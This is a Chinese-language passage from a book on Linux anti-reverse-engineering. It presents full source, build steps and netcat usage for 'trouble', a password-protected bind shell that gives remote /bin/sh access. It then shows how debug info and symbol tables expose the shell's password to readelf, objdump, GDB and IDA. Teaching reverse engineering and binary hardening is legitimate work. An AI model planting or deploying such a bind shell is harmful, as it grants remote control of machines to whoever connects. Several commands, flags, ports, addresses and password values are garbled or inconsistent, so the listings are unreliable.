
# Linux 编程：反逆向工程技术

“一切尚未丧失”

## 前言

- **隐藏网络通信**：理解二进制文件的网络通信对逆向工程有巨大的帮助。然而，这个话题太深，无法在这些书中进行充分探讨。
- **Rootkit 主题**：隐藏和持久化不在讨论范围内。
- **任何与内核相关的内容**

## 第 1 章：介绍

### `chap_1_introduction/trouble/CMakeLists.txt`

```cmake
project(trouble C)
cmake_minimum_required(VERSION 3.0)
```

这将为绑定 shell（bind shell）创建一个 32 字节的“密码”。该命令仅在运行 `cmake` 时执行，因此如果你想生成新密码，应该从命令行运行 `cmake ..;`。

```cmake
exec_program("/bin/sh")
${CMAKE_CURRENT_SOURCE_DIR}
ARGS -c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'
OUTPUT_VARIABLE random_password
```

将随机密码作为宏传递给 `${PROJECT_NAME}`：

```cmake
add_definitions(-Dpassword="${random_password}")
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -g -std=gnu")
add_executable(${PROJECT_NAME}) src/trouble.c
```

编译成功后，向用户显示随机密码：

```cmake
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
COMMAND ${CMAKE_COMMAND} -echo
"The bind shell password is: ${random_password}")
```

此文件不仅会生成 `trouble` 的 `Makefile`，而且每次执行时都会生成 shell 的 32 字节密码。使用以下命令通过 `urandom` 创建密码：

```bash
cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32
```

关于如何使用 CMake 的更多内容，将在接下来的编译 `trouble` 章节中解释。

### 代码部分

`trouble` 绑定代码位于 `source` 目录中。它由单个文件组成：

### `chap_1_introduction/trouble/trouble.c`

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <socket.h>
#include <netinet/in.h>

// 登录 shell 的密码
static const char s_password[] = password;

bool check_password(const char* p_password)
{
    // 验证密码
    return memcmp(s_password, p_password, sizeof(s_password) - 1) != 0;
}
```

这实现了一个相当简单的绑定 shell。服务器在允许访问 shell 之前首先要求输入密码。服务器目前在每次运行 `cmake ..` 时都会随机生成。服务器没有关闭机制，它将一直运行到被杀死为止。

```c
int main(int argc, char* p_argv[])
{
    (void)argc;
    (void)p_argv;

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr, "Failed to create the socket.");
        return EXIT_FAILURE;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind_addr.sin_port = htons(12700);
```

```c
int bind_result = bind(sock, (struct sockaddr*) &addr,
    sizeof(bind_addr));
if (bind_result != 0)
{
    perror("Bind call failed");
    return EXIT_FAILURE;
}

int listen_result = listen(sock, 5);
if (listen_result != 0)
{
    perror("Listen call failed");
    return EXIT_FAILURE;
}

while (true)
{
    int client_sock = accept(sock, NULL);
    if (client_sock < 0)
    {
        perror("Accept failed");
        return EXIT_FAILURE;
    }

    int child_pid = fork();
    if (child_pid == 0)
    {
        char password_input[64];
        read(client_sock, password_input, sizeof(password_input));
        if (check_password(password_input))
        {
            dup2(client_sock, STDIN_FILENO);
            dup2(client_sock, STDOUT_FILENO);
            dup2(client_sock, STDERR_FILENO);
            char* empty[] = {"/bin/sh", NULL};
            execve("/bin/sh", empty);
        }
        close(client_sock);
        exit(0);
    }
    close(client_sock);
}
```

`trouble.c` 创建了一个 socket 并绑定到 12700 端口。一旦连接建立，程序会 fork 并返回。

### 编译

如前所述，`trouble` 使用 CMake。如果你使用的是 Ubuntu，这非常简单：

```bash
sudo apt-get install cmake
```

安装完成后，你需要进入 `trouble` 所在的目录并创建一个 `build` 目录：

```bash
mkdir build
cd build
```

你需要在 `build` 目录下运行 `cmake` 来生成 `Makefile`：

```bash
cmake ..
```

输出如下：

```text
-- The C compiler identification is done
-- Checking for C compiler works
-- Checking for C compiler works
-- Detecting C compiler info
-- Detecting C compiler features done
-- Configuring done
-- Generating done
-- Build files have been written to:
 /path/to/build
```

最后一步是使用 `make`：

```bash
make
[20%] Scanning dependencies for target
[50%] Building src/trouble.o
[100%] Building src/trouble.o
-- Linking C executable
[100%] Built target
```

### 执行

执行 `trouble` 非常简单。它不接受任何选项，如果端口 12700 已被占用，它通常会失败。要在前台运行，只需在 `build` 目录下执行 `./trouble`：

```bash
./trouble
```

### 访问 Shell

建议使用 `netcat` 连接 `trouble`。连接后，输入密码即可执行 shell 命令。如果密码错误，连接将被断开。参考下例：

连接 `trouble`：

```bash
nc 192.168.1.182 1270
password_here
pwd
/home/albino-lobster/antire_book/chap_1_introduction/trouble/build
ls -l
total 48
-rw-r-r-- 1 albino-lobster albino-lobster 10544 Oct 18 17:07 CMake.txt
drwxrxr-x 5 albino-lobster albino-lobster 4096 Oct 18 17:22 CMakeFiles
-rw-r-r-- 1 albino-lobster albino-lobster 4986 Oct 18 17:22 Makefile
-rw-r-r-- 1 albino-lobster albino-lobster 1437 Oct 18 17:07 cmake_install.cmake
-rwxrxr-x 1 albino-lobster albino-lobster 17488 Oct 18 17:22 trouble
```

## 第 2 章：编译器选项

在讨论反逆向工程时，编译器选项往往被忽视。然而，理解不同选项如何改变最终的二进制文件至关重要。编译器可以是你最的敌人，泄露你所有的秘密；也可以是你最好的朋友，剥离不必要的信息。

![](img/fdf1e4bfff3995dc5a8580eb00fa23e5_15_0.png)

### 聚焦 GCC

书中的代码期望使用 GCC 作为编译器。这并不是说不能使用 Clang 或其他编译器。它们完全可以使用。然而，使用 GCC 是因为它在多年来一直是事实上的标准。

如果你不熟悉 CMake 或 GCC，你可能会疑惑我所说的编译器选项是什么。如果你回看第一章的 `CMakeLists.txt` 文件，你会发现这些内容：

```
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -g -std=gnu")
```

这些就是编译器选项。GCC 支持许多选项³并维护着详细的文档。《Trouble》第一章中使用的标志是可用选项的子集。

在上面的编译器选项中，所有以 `-W` 开头的选项都是警告选项⁴，告诉编译器检查特定类型的编程错误。`-g` 选项指示编译器在二进制文件中包含调试信息⁵。最后，`-std=gnu11` 告诉编译器你预期的 C 代码遵循 C 编程⁶中 C11 标准的 GNU 方言。GNU 部分扩展不属于 C11 标准。

³https://gcc.gnu.org/linedocs/gcc/Option-Summary.html

⁴https://gcc.gnu.org/linedocs/gcc/Warning-Options.html#Warning-Options

⁵https://gcc.gnu.org/linedocs/gcc/Debugging-Options.html#Debugging-Options

⁶https://gcc.gnu.org/linedocs/gcc/C-Dialect-Options.html#C-Dialect-Options

### `-g`

如前所述，你可以使用 `-g` 标志指示 GCC 在你的程序中包含调试信息。为了更好地理解我所说的“包含调试信息”是什么意思，请使用命令行工具 `readelf` 对 `trouble` 进行操作。

### `readelf`

`readelf` 是一个理解可执行和可链接格式（ELF）的命令行工具。ELF 是 Linux 可执行文件、共享库和核心转储的标准格式。`readelf` 可以提供二进制文件并显示关于其格式的信息。`readelf` 预装在 Ubuntu 16.04 中。

`readelf` 有许多命令行选项。其中一个选项 `-S` 将显示提供的二进制文件的节头（section headers）。

列出 `trouble` 的节：

```bash
albino-lobster@ubuntu:-~/antire_book/chap_2_compiler/trouble/build$ readelf -S ./trouble
There are 36 section headers, starting at offset 0x3c8:

### Section Headers:

| Name | Size | Type | Address | Offset | Flags | Link | Info | Align |
|---|---|---|---|---|---|---|---|---|
| [0] | | NULL | 0000000000000000 | 0000000000000000 | 00000000 | 0 | 0 | 0 |
| [1] | .interp | PROBITS | 0000000000000000 | 0000000000000001c | 00000000000004238 | A | 0 | 1 | 00000238 |
| [2] | .ABI-tag | NOTE | 0000000000000000 | 0000000000000020 | 00000000000004254 | A | 0 | 4 | 00000254 |
| [3] | .gnu.gnu-build-i | NOTE | 0000000000000000 | 0000000000000024 | 00000000000004274 | A | 0 | 4 | 00000274 |
| [4] | .gnu.hash | GNU_HASH | 0000000000000000 | 0000000000000064 | 0000000000000298 | A | 5 | 0 | 8 | 00000298 |
| [5] | .dynym | DYNAMIC | 0000000000000000 | 0000000000000038 | 00000000000004300 | A | 6 | 1 | 8 | 00000300 |
```

> https://en.wikipedia.org/wiki/Executable_and_Linkable_Format

| Name | Size | Type | Address | Offset | Flags | Link | Info | Align |
|---|---|---|---|---|---|---|---|---|
| [ 6 | .dynstr | STRTAB | 0000000000000648 | 0000000000000648 | 000000000000015e | A | 0 | 1 |
| [ 7 | .gnu.version | NOTE | 00000000000007a6 | 00000000000007a6 | 0000000000000046 | A | 5 | 2 |
| [ 8 | .gnu.version_r | NOTE | 00000000000007f0 | 00000000000007f0 | 0000000000000030 | A | 6 | 1 |
| [ 9 | .rela.dyn | RELA | 0000000000000820 | 0000000000000820 | 0000000000000030 | A | 5 | 0 |
| [ 10 | .rela.plt | RELA | 0000000000000850 | 0000000000000850 | 0000000000000180 | AI | 2 | 8 |
| [ 11 | .init | PROGBITS | 00000000000009d0 | 00000000000009d0 | 000000000000000a | AX | 0 | 4 |
| [ 12 | .plt | PROGBITS | 00000000000009f0 | 00000000000009f0 | 0000000000000010 | AX | 0 | 16 |
| [ 13 | .plt.got | PROGBITS | 00000000000000b0 | 00000000000000b0 | 0000000000000000 | AX | 0 | 8 |
| [ 14 | .text | PROGBITS | 0000000000000b10 | 0000000000000b10 | 00000000000003c2 | AX | 0 | 16 |
| [ 15 | .fini | PROGBITS | 0000000000000ed4 | 0000000000000ed4 | 0000000000000000 | AX | 0 | 4 |
| [ 16 | .rodata | PROGBITS | 0000000000000ee0 | 0000000000000ee0 | 000000000000009d | A | 0 | 32 |



# 第 2 章：编译器选项

## ELF 节表

以下是 ELF 文件的节表信息：

| 索引 | 节名 | 类型 | 地址 | 偏移 | 大小 | 标志 | 链接 | 对齐 |
|------|------|------|------|------|------|------|------|------|
| 17 | `.eh_frame_hdr` | PROGBITS | `0000000000000f80` | `0000000000000f80` | `000000000000003c` | A | 0 | 4 |
| 18 | `.eh_frame` | PROGBITS | `000000000000fc00` | `000000000000fc00` | `0000000000000114` | A | 0 | 8 |
| 19 | `.init_array` | INIT_ARRAY | `00000000000001e0` | `00000100000001e0` | `0000000000000008` | WA | 0 | 8 |
| 20 | `.fini_array` | FINI_ARRAY | `00000000000001e8` | `000001e8000001e8` | `0000000000000000` | WA | 0 | 8 |
| 21 | `.jcr` | PROGBITS | `0000000000000120` | `0000012000000120` | `0000000000000008` | WA | 0 | 8 |
| 22 | `.dynamic` | DYNAMIC | `0000000000000128` | `0000012800000128` | `00000000000000d0` | WA | 0 | 8 |
| 23 | `.got` | PROGBITS | `00000000000001f8` | `000001f8000001f8` | `0000000000000000` | WA | 0 | 8 |
| 24 | `.got.plt` | PROGBITS | `0000000000000200` | `0000020000000200` | `0000000000000098` | WA | 0 | 8 |
| 25 | `.data` | PROGBITS | `0000000000000298` | `0000029800000298` | `0000000000000010` | WA | 0 | 8 |
| 26 | `.bss` | NOBITS | `00000000000002c0` | `000002a0000002c0` | `0000000000000010` | WA | 0 | 32 |
| 27 | `.comment` | PROGBITS | `00000000000002a8` | `000002a8000002a8` | | | | |

```bash
[ 28 | .debug_aranges | PROGBITS | 0000000000000000 | 000002dc000002dc | 0000000000000030 | MS | 0 | 1 |
[ 29 | .debug_info | PROGBITS | 0000000000000000 | 0000021c0000021c | 0000000000000050 | | | 0 | 1 |
[ 30 | .debug_abbrev | PROGBITS | 0000000000000000 | 000002ec000002ec | 0000000000000127 | | 0 | 1 |
[ 31 | .debug_line | PROGBITS | 0000000000000000 | 00000281300002813 | 0000000000000192 | | 0 | 1 |
[ 32 | .debug_str | PROGBITS | 0000000000000000 | 000002a5c00002a5c | 0000000000000593 | MS | 0 | 1 |
[ 33 | .shhtab | STRTAB | 0000000000000000 | 000003ae8000003ae8 | 000000000000014c | | 0 | 1 |
[ 34 | .symtab | SYMTAB | 0000000000000000 | 00002f3800002f38 | 0000000000000858 | 35 | 55 | 8 |
[ 35 | .strtab | STRTAB | 0000000000000000 | 00000379000003790 | 0000000000000358 | | 0 | 1 |
```

标志位说明：W (write), A (alloc), X (execute), M (merge), S (strings), l (large), I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown), O (extra OS processing required), o (OS specific), p (processor specific)

你看到上面输出中从索引 28 开始、以 `debug_` 开头的五个节了吗？DWARF 代表“带有属性格式的调试（info）”，它是 GCC 用于存储调试信息的默认格式。对于这本书来说，最有趣的节是 `.debug_info`。你可以使用命令行工具 `objdump` 查看 `.debug_info` 的内容。

> http://dwarfstd.org/

## objdump

`objdump` 显示一个或多个对象文件的信息。选项控制显示哪些特定信息。这些信息对于编写编译工具的程序员来说非常有用，而不是只想让程序编译并运行的程序员。要显示 `.debug_info` 中的 DWARF 信息，请在 `objdump` 中使用 `--DWARF-info` 标志。运行此命令会生成输出列表，我已经对其进行了裁剪以关注特定信息。

```bash
albino-lobster@ubuntu:-~/antire_book/chap_2_compiler/trouble/build$ objdump --DWARF-info ./trouble

file format elf64-x86-64

Contents of the .debug_info:

Compilation Unit @ offset 0x0:

Length: 0x5dc (32-bit)

Version: 4

Abbrev Offset: 0x0

Pointer Size: 8

<0b>: Abbrev Number: 1 (DW_TAG_compile_unit)

<c> DW_AT_PRODUC : (indirect string, offset: 0xaf6): GNU 11 5.4.0 20160609

-m-generic-march=x86-64 -g -gnu1 -fstack-protector-strong

<10> DW_AT_language : 12 (ANSI C99)

<11> DW_AT_name : (indirect string, offset: 0x21d): /home/albino-lobster/

antire_book/chap_2_compiler/trouble/src/trouble.c

<15> DW_AT_comp_dir : (indirect string, offset: 0x366): /home/albino-lobster-

antire_book/chap_2_compiler/trouble/build

<19> DW_AT_low_pc : 0x400c06

<21> DW_AT_high_pc : 0x257

<29> DW_AT_stmt_list : 0x0

<5ba>: Abbrev Number: 21 (DW_TAG_variable)

<5bb> DW_AT_name : (indirect string, offset: 0x1aa): password

<5bf> DW_AT_declcl_file : 1
```

```bash
<5c0> DW_AT_decl_line : 11
<5c1> DW_AT_type : <0x5cf>
<5c5> DW_AT_location : 9 byte block: (DW_OP_addr: 400f00)
```

`.debug_info` 段包含了调试器所需的有用信息，但对于任何尝试将属性绑定到特定操作的人来说也有用。例如，在输出中，你可以看到源文件的完整路径（`/home/albino-lobster/antire_book/chap_2_compiler/trouble/src/trouble.c`）、编译目录的完整路径（`/home/albino-lobster/antire_book/chap_2_compiler/trouble/build`）、声明的 C 版本（GNU C 5.4.0 20160609），甚至还有变量 `s_password` 所在的行号（`DW_AT_decl_line: 1`）。

这看起来信息量大得惊人，但在调试时确实非常有用。例如，考虑这个由 GDB 生成的回溯信息。

## 在 GDB 中生成回溯

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb .trouble
GNU gdb (Ubuntu 7.11.1-0ubuntu1-16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3: GNU GPL version 3 or later <http://www.gnu.org/licenses/gpl.html>
此文件为软件：你可以自由地更改和分发它。
在法律允许的范围内，不提供任何保证。输入 "show copying" 和 "show warranty" 查看详情。
此 GDB 配置为 "x86_64-linux-gnu"。输入 "show configuration" 查看配置详情。
有关错误报告的说明，请参阅：
<://www.gnu.org/software/gdb/bugs/.
在线查找 GDB 手册和其他文档资源：
<://www.gnu.org/software/gdb/documentation/.
如需帮助，输入 "help"。
输入 "apropos word" 搜索与 "word" 相关的命令。
从 ..trouble... 读取符号...
(gdb)
run
启动程序: /home/albino-lobster/antire_book/chap_2_compiler/trouble/trouble/
^C
程序接收信号 SIGINT，中断。
0x00007ffff7b154b0 in __accept_nocancel () at ../sysdeps/unix/syscall-template.S:84
    ../sysdeps/unix/syscall-template.S: 没有此文件或目录。
(gdb) bt
#0 0x00007ffff7b154b0 in __accept_nocancel () at ../sysdeps/unix/syscall-template.S:84
#1 0x0000000000040036 in main (p_argc=1, p_argv=0x7ffffffffdeb8) at /home/albino-lobster/antire_book/chap_2_compiler/src/trouble.c:59
```

注意回溯中包含 `main()` 函数中的参数名 `p_argc` 和 `p_argv`？这些是 Trouble 源码中使用的完全名称。此外，`trouble.c` 中调用 `accept()` 的行号也是可见（第 59 行）。GDB 能够显示这些信息是因为 Trouble 中存在 `.debug_info` 段。

由于这些信息让调试变得简单，每个程序员在编写程序时都会使用 `-g` 选项。然而，正如你所看到的，这对逆向工程师来说也有用。

## 使用 Hexxdump 恢复 Bind Shell 密码

在上一节中，你通过 `.debug_info` 中的 DWARF 信息看到了 `s_password` 声明的行号。如果你再次查看该输出，还可以看到 `s_password` 存储的地址。

**objdump 中的 s_password**

```bash
<5bb> DW_AT_name : (indirect string, offset: 0x1aa): s_password
<5bf> DW_AT_file : 1
<5c0> DW_AT_decl_line : 11
<5c1> DW_AT_type : <0x5cf>
<5c5> DW_AT_location : 9 byte block: (DW_OP_addr: 400f00)
```

`s_password` 存储在虚拟地址 `0x400f00`。将虚拟地址转换为文件偏移，你就可以使用 `hexxdump` 提取 `s_password` 的内容。要将 `0x400f00` 转换为文件偏移，需要找到程序头。

## 查看 Trouble 的程序头

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble$ readelf -l ./trouble

Elf 文件为 EXEC (可执行文件)

入口点 0x400b10

有 9 个程序头，从偏移量 64 开始

| Type | Offset | VirtAddr | PhysAddr | FileSize | MemSize | Flags | Align |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| PHDR | 0x0000000000000040 | 0x0000000000000040 | 0x0000000000000040 | 0x40 | 0x40 | | 0x10 |
| LOAD | 0x00000000000000f8 | 0x00000000000000f8 | 0x00000000000000f8 | 0xf8 | 0xf8 | R | 0x8 |
| INTERP | 0x0000000000000028 | 0x0000000000000028 | 0x0000000000000028 | 0x28 | 0x28 | R | 0x100 |
| LOAD | 0x000000000000000c | 0x000000000000000c | 0x000000000000000c | 0x1c | 0x1c | R | 1 |
| | interpreter: /lib64/ld-linux-x86-64.so | | | | | | |
| LOAD | 0x0000000000000000 | 0x0000000000000000 | 0x0000000000000000 | 0x0 | 0x0 | | |
| | | 0x0000000000000d4 | | | | R | |
| LOAD | 0x00000000000001e0 | 0x00000000000001e0 | 0x00000000000001e0 | 0xe0 | 0xe0 | R | 0x200000 |
| | | 0x0000000000000028 | | | RW | 0x200000 |
| DYNAMIC | 0x0000000000000128 | 0x0000000000000128 | 0x0000000000000128 | 0x128 | 0x128 | | |
| | | 0x00000000000001d0 | | | RW | 8 |
| NOTE | 0x0000000000000254 | 0x0000000000000254 | 0x0000000000000254 | 0x254 | 0x254 | | |
| | | 0x000000000000044 | | | R | 4 |
| GNU_EH_FRAME | 0x00000000000000f0 | 0x00000000000000f0 | 0x00000000000000f0 | 0xf0 | 0xf0 | | |
| | | 0x00000000000003c | | | R | 4 |
| GNU_STACK | 0x0000000000000000 | 0x0000000000000000 | 0x0000000000000000 | 0x0 | 0x0 | | |
| | | 0x0000000000000000 | | | RW | 10 |
| GNU_RELRO | 0x00000000000001e0 | 0x00000000000001e0 | 0x00000000000001e0 | 0xe10 | 0xe10 | | |
| | | 0x00000000000001f0 | | | | R | 1 |
```

`s_password` 的虚拟地址落在第一个 `LOAD` 段范围内，该范围涵盖了 `0x400000` 到 `0x401d4`。第一个 `LOAD` 段从文件偏移 0 开始。因此，要计算 `s_password` 在文件中的偏移，你需要从 `0x400f00` 减去 `0x400000`。这意味着你应该能够在 `0xf00` 处找到 shell 的密码。使用 hexdump 显示它。

## 使用 hexdump 打印 s_password



```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ hexdump -C -s 0xf0 -n 64 ./trouble
00000f00: 54 47 4f 45 75 32 36 57 30 6b 31 62 39 49 |TGOEu26W0k1b9I|
00000f10: 58 6a 55 62 64 31 47 63 63 53 63 65 |Xubd1GccSce|
00000f20: 00 46 61 69 63 65 65 24 74 28 66 65 71 |Failed to create|
00000f30: 65 20 74 68 65 20 73 6f 63 65 74 |the socket..|
```

就这样，`Trouble` 的 shell 暴露了。

### 使用 GDB 恢复 Shell

上一节恢复密码的方法很复杂，使用 GDB 恢复 `s_password` 可以更容易。

### 使用 GDB 打印 s_password

```
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble
Gdb (Ubuntu 7.11.1-0ubuntu1-16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GPL 3 or later <http://www.gnu.org/licenses/gpl.html>
此文件为软件：你可以自由地更改和分发它。
在法律允许的范围内，不提供任何保证。输入 "show copying" 和 "show warranty" 查看详情。
此 GDB 配置为 "x86_64-linux-gnu"。输入 "show configuration" 查看配置详情。
有关错误报告的说明，请参阅：<://www.gnu.org/software/gdb/bugs/.
在线查找 GDB 手册和其他文档资源：<http://www.gnu.org/software/gdb/documentation/.
如需帮助，输入 "help"。
输入 "apropos word" 搜索与 "word" 相关的命令。
从 ./trouble... 读取符号...完成。
(gdb) start
临时断点 1 at 0x400c3e: /home/albino-lobster/antire_book/chap_2_compiler/src/trouble.c,26
启动程序: /home/albino-lobster/antire_book/chap_2_compiler/build/trouble
临时断点 1, main (p_argc=1, p_argv=0x7ffffffff8) at /home/albino-lobster/antire_book/chap_2_compiler/src/trouble.c:26

{
(gdb) print s_password
$1 = "TGOEu26Tw0k1b9Ixjb1Gf"
(gdb)
```

在上面的输出中，我使用 GDB 执行了 `Trouble`。GDB 停在 `main()` 处的断点处。然后我使用 GDB 的 `print` 函数显示 `s_password`。没有比这更简单的操作了！

### 在 IDA 中调试

调试信息不仅对于快速发现 `s_password` 有用，在像 Interactive Disassembler (IDA）这样的反汇编器中查看反汇编也有用。调试信息有助于传播变量类型和名称。

例如，考虑调用 `check_password()` 附近的这段汇编。

IDA 中的调试信息

```
.text:000000000000400D loc_400DBC:      CODE XREF: main+177
.text:00000000000040BC      lea     rax, [rbp+password_input]
.text:00000000000040D0      mov     rdi, eax      ; p_password
.text:00000000000040D3      call    check_password
.text:00000000000040D8      test    eax, al
.text:00000000000040DCA      jz      short loc_400DDD
.text:00000000000040DCC      mov     eax, [rbp+client_sock]
.text:00000000000040DCF      mov     edi, eax      ; fd
.text:00000000000040DD1      call    _close
.text:00000000000040D6      mov     eax, 1
.text:00000000000040DDB      jmp     short loc_400E47
```

现在看对应的 C 语言代码块。

### C 语言中的 check_password() 调用

```c
if (check_password(password_input))
    close(client_sock);
    return EXIT_FAILURE;
```

注意，`password_input` 和 `client_sock` 出现在反汇编代码和 C 代码中了吗？此外，`p_password`（`check_password()` 唯一参数使用的名称）也出现在反汇编中。IDA 解析了 `.debug_info` 中的 DWARF 信息，并用这些更易理解的变量名丰富了反汇编代码。对于逆向工程师来说，这非常有用，因为许多程序员会使用上下文相关的变量名（例如 `password_input` 是存储用户提交密码的地方）。

### 移除调试信息

我可能已经说服了你不能让逆向工程师访问调试信息。幸运的是，移除调试信息非常简单。你只需要在编译选项标志中不提供 `-g` 选项即可。这将防止生成各种 `.debug_sections`。这也意味着 GDB 和 IDA 将不会接收到额外的变量信息来丰富它们的分析。

例如，如果没有 `-g`，GDB 用户将无法像本节之前那样使用 `print` 打印 `s_password`。遗憾的是，这并不意味着逆向工程师不能通过其他手段让 GDB 打印它，我们稍后会讨论。

## 第 2 章：编译器选项

在没有调试信息的情况下使用 GDB 打印 s_password

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble
GNU gdb (Ubuntu 7.11.1-0ubuntu1.16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GPL version 3 or later <http://gnu.org/licenses/gpl.html>
这是免费软件：你可以修改并重新发行它。
在法律允许的范围内，不提供任何保证。输入 "show copying" 和 "show warranty" 查看详情。
此 GDB 配置为 "x86_64-linux-gnu"。输入 "show configuration" 查看配置详情。
有关错误报告的说明，请参见：
<http://www.gnu.org/software/gdb/>。
在网上查找 GDB 手册和其他文档资源：
<http://www.gnu.org/software/gdb/documentation/>。
需帮助时输入 "help"。
输入 apropos 搜索与 "word" 相关的命令...
从 ./trouble... 读取符号...(未找到调试符号)...
(gdb)
start
临时断点 1, 0x40c333
启动程序: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trouble

```gdb

Temporary breakpoint 1, 0x000000000000400c33 in main ()

(gdb) print s_password

$1 = 1364801095

(gdb) x /s &s_password

0x400f00: <s_password>: "TGOUEu26TW0k1b9IeXuJbT1GfCR0@jSnl"

(gdb)

```

最后，考虑一下在没有调试信息的情况下，`check_password()` 调用周围的反汇编代码是什么样的。

## 第 2 章：编译器选项

在没有调试信息的情况下在 IDA 中查看 check_password() 调用

```assembly

.text:00000000040DBC loc_400DBC:      ; CODE XREF: main+17j

.text:00000000040DBC      lea     rax, [rbp+buf]

.text:00000000040DBC      mov     rdi, rax

.text:00000000040DC00      call    check_password

.text:00000000040DC03      test    al, al

.text:00000000040DC08      jz      short loc_400DDD

.text:00000000040DCA      mov     eax, [rbp-5C]

.text:00000000040DC0C      mov     edi, eax      ; fd

.text:00000000040DC0F      call    _close

.text:00000000040DCD1      mov     eax, 1

.text:00000000040DC06      jmp     short loc_400E47

.text:00000000040DDB8

```

这段反汇编代码并不难理解，但当变量名存在时它变得更容易了！

### 案例研究：XOR DDOS

使用和移除调试信息是一个初级课题，但我认为了解它很重要。你可能想：“没有人会担心逆向工程师会发布带有调试信息的二进制文件吧！”然而，我可以向你保证他们确实这样做。

例如 XOR DDOS 恶意软件¹¹²。

### 恶意软件

在下载和分析恶意软件时要小心

正如 MalwareMustDie¹¹ 的分析所示，该恶意软件使用加密方案加密/解密配置文件、数据包和“远程字符串”。然而，仅仅通过查看 VirusTotal 链接中的部分我就知道调试信息的存在，这使得二进制文件成为逆向工程师的极佳玩具。记得调试信息是有用的吗？在前面的部分，我们从编译选项中移除了 `-g` 标志。在这个部分，我们添加 `-s` 标志。GCC 文档说 `-s` 标志将移除可执行文件的符号表。

更新 `chap_2/trouble/CMakeLists.txt`：

```cmake

set(CMAKE_C_FLAGS "-Wall -s -std=gnu")

```

# SYMTAB vs DYSYM

正如 GCC 文档所述，`-s` 会剥离符号表。这意味着什么？让我们使用 `readelf` 查看未剥离的文件的符号表。

```bash

albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble$ readelf ./trouble
```



`.dynsym` 包含 35 个条目：

| Value | Size | Type | Bind | Name |
|---|---|---|---|---|
| 0: 0000000000000000 | | NOTYPE | DEFAULT | |
| 1: 0000000000000000 | | NOTYPE | WEAK | `__ITM_deregister` |
| 2: 0000000000000000 | | FUNC | DEFAULT | `__stack` |
| 3: 0000000000000000 | | FUNC | DEFAULT | `fork_GLIBC.2.2` (4) |
| 4: 0000000000000000 | | FUNC | DEFAULT | `htons_GLIBC.2.2` (3) |
| 5: 0000000000000000 | | FUNC | DEFAULT | `htonl_GLIBC.2.2` (3) |
| 6: 0000000000000000 | | FUNC | DEFAULT | `close_GLIBC.2.2` (3) |
| 7: 0000000000000000 | | FUNC | DEFAULT | `read_GLIBC.2.2` (3) |
| 8: 0000000000000000 | | FUNC | DEFAULT | `__libc_start` |
| 9: 0000000000000000 | | FUNC | DEFAULT | `memcmp_GLIBC.2.2` (5) |
| 10: 0000000000000000 | | FUNC | DEFAULT | `execve_GLIBC.2.2` (3) |
| 11: 0000000000000000 | | NOTYPE | WEAK | DEFAULT | `_start` |
| 12: 0000000000000000 | | FUNC | DEFAULT | `listen_GLIBC.2.2` (3) |
| 13: 0000000000000000 | | FUNC | DEFAULT | `bind_GLIBC.2.2` (3) |
| 14: 0000000000000000 | | FUNC | DEFAULT | `perror_GLIBC.2.2` (3) |
| 15: 0000000000000000 | | NOTYPE | WEAK | DEFAULT | `_dl_RegisterClasses` |
| 16: 0000000000000000 | | FUNC | DEFAULT | `accept_GLIBC.2.2` (5) |
| 17: 0000000000000000 | | FUNC | DEFAULT | `fwrite_GLIBC.2.2` (3) |
| 18: 0000000000000000 | | NOTYPE | WEAK | DEFAULT | `__ITM_deregisterTable` |
| 19: 0000000000000000 | | FUNC | DEFAULT | `fork_GLIBC.2.2` (5) |
| 20: 0000000000000000 | | FUNC | DEFAULT | `socket_GLIBC.2.2` (3) |
| 21: 000000000006202a8 | | NOTYPE | GLOBAL | DEFAULT | `_edata` |
| 22: 00000000000062098 | | NOTYPE | GLOBAL | DEFAULT | `__data_start` |
| 23: 000000000000620d0 | | NOTYPE | GLOBAL | DEFAULT | `_end` |

## 第 2 章：编译器选项

24: 00000000000400c6 41 FUNC GLOBAL DEFAULT 14 `check_password`
25: 0000000000602098 0 TYPE WEAK DEFAULT 25 `data_start`
26: 00000000006000e0 0 OBJECT GLOBAL DEFAULT 16 `_IO_std_used`
27: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 `__libc_csu_init`
28: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 `__start`
29: 00000000006002a8 0 TYPE GLOBAL DEFAULT 26 `__bss_start`
30: 00000000004002cf 558 FUNC GLOBAL DEFAULT 14 `main`
31: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 `_init`
32: 00000000006002c0 8 OBJECT GLOBAL DEFAULT 26 `stderr@GLIBC_2.2.5` (3)
33: 00000000004000e0 2 FUNC GLOBAL DEFAULT 14 `__libc_csu_fini`
34: 00000000004004ed4 0 FUNC GLOBAL DEFAULT 15 `_fini`

符号表 `.symtab` 包含 84 个条目：

| Num | Value | Type | Bind | Vdx | Name |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 0 | 0000000000000000 | 0 TYPE LOCAL DEFAULT | UND | | |
| 1 | 0000000000400238 | 0 SECTION LOCAL DEFAULT | 1 | | |
| 2 | 0000000000400254 | 0 SECTION LOCAL DEFAULT | 2 | | |
| 3 | 0000000000400274 | 0 SECTION LOCAL DEFAULT | 3 | | |
